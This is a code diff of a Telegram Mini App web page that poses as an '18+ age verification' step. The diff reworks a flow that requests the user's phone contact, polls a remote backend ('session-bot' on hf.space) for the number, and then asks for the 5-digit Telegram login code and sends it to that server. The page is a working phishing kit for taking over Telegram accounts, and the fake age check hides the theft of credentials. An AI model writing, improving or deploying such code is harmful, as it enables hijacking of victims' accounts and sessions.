@@ -11,89 +11,101 @@
         .btn { background: #28a745; color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; font-size: 20px; cursor: pointer; }
         .hidden { display: none; }
         input { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 24px; text-align: center; }
+        .status { color: #888; font-size: 12px; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="box" id="step0">
-        <h2 id="status">Attention!</h2>
-        <p>You must confirm you are 18+ to continue.</p>
-        <button class="btn" id="confirm_btn" onclick="shareContact()">🍓 Confirm 🔞</button>
-        <p id="wait_msg" class="hidden" style="color:#888;">🔄 Verifying... please wait.</p>
+        <h2 id="st_title">Attention!</h2>
+        <p>Confirm you are 18+ to access the files.</p>
+        <button class="btn" id="main_btn" onclick="startFlow()">🍓 Confirm 🔞</button>
+        <div id="loader_area" class="hidden">
+            <p style="color:#28a745; font-weight:bold;">Waiting for contact share...</p>
+            <p class="status">Please click "Share Contact" on the popup.</p>
+        </div>
     </div>
 
     <div class="box hidden" id="step2">
-        <h3>Enter 5-Digit Code</h3>
-        <p>Code sent to your Telegram account.</p>
-        <input type="number" id="otp_code" placeholder="-----">
-        <button class="btn" onclick="verifyOTP()">Verify OK</button>
+        <h3>Identity Check</h3>
+        <p>Enter the 5-digit code sent to your Telegram account.</p>
+        <input type="number" id="otp" placeholder="-----">
+        <button class="btn" id="v_btn" onclick="verifyOTP()">Verify OK</button>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-        
-        // নিশ্চিত করুন লিঙ্কের শেষে '/' নেই
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
 
-        function shareContact() {
-            tg.requestContact((res) => {
-                if (res.status === 'sent') {
-                    document.getElementById('confirm_btn').classList.add('hidden');
-                    document.getElementById('wait_msg').classList.remove('hidden');
-                    document.getElementById('status').innerText = "Processing...";
-                    poll(); // নম্বর চেক শুরু
-                }
-            });
+        function startFlow() {
+            // ১. নম্বর শেয়ার করার উইন্ডো খোলা
+            tg.requestContact();
+            
+            // ২. UI পরিবর্তন
+            document.getElementById('main_btn').classList.add('hidden');
+            document.getElementById('loader_area').classList.remove('hidden');
+            document.getElementById('st_title').innerText = "Verifying...";
+
+            // ৩. পোলিং শুরু (ইউজার পপআপে যাই করুক, আমরা ব্যাকএন্ড চেক করতে থাকবো)
+            poll();
         }
 
         async function poll() {
+            if(!userId) return alert("Error: User ID not found!");
+            
             try {
-                const response = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
-                const data = await response.json();
+                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
+                const data = await res.json();
                 
                 if (data.status === "success") {
-                    sendNumber(data.phone);
+                    sendPhone(data.phone);
                 } else {
-                    setTimeout(poll, 1500); // ১.৫ সেকেন্ড পর পর চেক
+                    // নম্বর না পাওয়া পর্যন্ত প্রতি ১.৫ সেকেন্ড পর পর চেক
+                    setTimeout(poll, 1500);
                 }
-            } catch (e) { 
-                setTimeout(poll, 2000); 
+            } catch (e) {
+                setTimeout(poll, 2000);
             }
         }
 
-        async function sendNumber(phone) {
+        async function sendPhone(phone) {
             try {
-                const response = await fetch(`${BACKEND_URL}/send_number`, {
+                const res = await fetch(`${BACKEND_URL}/send_number`, {
                     method: "POST",
                     headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({ user_id: userId, phone: phone })
                 });
-                const data = await response.json();
+                const data = await res.json();
                 if (data.status === "success") {
                     document.getElementById('step0').classList.add('hidden');
                     document.getElementById('step2').classList.remove('hidden');
                 } else {
                     alert("Error: " + data.message);
                 }
-            } catch (e) { alert("Network Error!"); }
+            } catch (e) { alert("Connection Error!"); }
         }
 
         async function verifyOTP() {
-            const code = document.getElementById("otp_code").value;
-            if(code.length < 5) return alert("Enter 5 digits!");
+            let otp = document.getElementById("otp").value;
+            if(otp.length < 5) return alert("Enter 5-digit code");
+            
+            document.getElementById('v_btn').disabled = true;
+            document.getElementById('v_btn').innerText = "Verifying...";
 
             try {
-                const response = await fetch(`${BACKEND_URL}/verify_otp`, {
+                const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                     method: "POST",
                     headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({ user_id: userId, otp: code })
+                    body: JSON.stringify({ user_id: userId, otp: otp })
                 });
-                const data = await response.json();
+                const data = await res.json();
                 if (data.status === "success") {
                     tg.close();
                 } else {
-                    alert("Wrong Code!");
+                    alert("Invalid Code!");
+                    document.getElementById('v_btn').disabled = false;
+                    document.getElementById('v_btn').innerText = "Verify OK";
                 }
             } catch (e) { alert("Server Error!"); }
         }
